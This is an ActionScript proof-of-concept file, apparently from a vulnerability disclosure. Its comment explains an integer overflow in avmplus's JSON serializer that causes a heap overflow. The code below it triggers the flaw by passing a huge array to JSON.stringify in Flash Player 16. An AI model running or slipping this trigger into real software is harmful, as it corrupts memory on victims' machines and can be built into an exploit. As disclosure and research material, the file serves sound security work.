/*
build: <path to flex_sdk_4.6>/bin/mxmlc StringifyOverflow.as

The JSONSerializer class in JSONClass.cpp in avmplus (https://github.com/adobe-flash/avmplus) uses the JSONSerializer::Rope inner class to manage the memory associated with the JSON-serialized output string. JSONSerializer::Rope has a linked list of JSONSerializer::Rope::Chunks, each of which store around 4k of serialized output.

Once the entire input object has been serialized a final output buffer is allocated and the Chunks and all copied into the single output buffer.

The Rope class uses the m_len member to accumulate the total size of all the bytes in the linked-list of Chunks:

...
             int32_t            m_len;
...
             REALLY_INLINE void emit(utf8_t const* buf, int32_t len) {
                 while (len > 0) {
                     int32_t wrote = m_ropeEnd->emit(buf, len);
                     len -= wrote;
                     AvmAssert(len >= 0);
                     buf += wrote;
                     m_len += wrote;                         <--- (a) update the total length of the rope
                     if (m_ropeEnd->exhausted()) {
                         Chunk* newchunk = newChunk(m_ropeEnd);
                         m_ropeEnd = newchunk;
                     }
                 }
             }

This length is then used when the concat() function is called to allocate a buffer for the output string:

             char* concat() {
                 AvmAssert(checkLength() == m_len);
                 char* dst = (char*)m_fixedmalloc->Alloc(m_len);   <--- (b) use m_len
                 char* end = dst;
                 Chunk* r = m_ropeStart;
                 while (r != NULL) {                               <--- (c) walk the chunks LL
                     memcpy(end, r->m_payload, r->m_cursor);
                     end += r->m_cursor;
                     r = r->m_next;
                 }
                 return dst;
             }

There is no integer overflow check at (a) so by serializing a large object we can overflow m_len leading to an undersized allocation at (b) and a heap overflow at (c) when the linked list is traversed and the chunks are copied.

Attached PoC has been tested against the latest version of Flash Projector for OS X (16.0.0.235)

ianbeer
*/

package {
  import flash.display.Sprite;
  import flash.text.TextField;

  public class StringifyOverflow extends Sprite {

    public function StringifyOverflow() {

      var str:String = "A";
      var i:uint = 0;
      for (i = 0; i < 12; i++){
        str += str;
      }

      var arr:Array = new Array();
      for (i = 0; i < 1024*1024; i++){
        arr.push(str);
      }

      JSON.stringify(arr);

      var textField:TextField = new TextField();
      textField.text = "Hello, stringify!";
      addChild(textField);

      trace("Hello, world!");
    }
  }
}
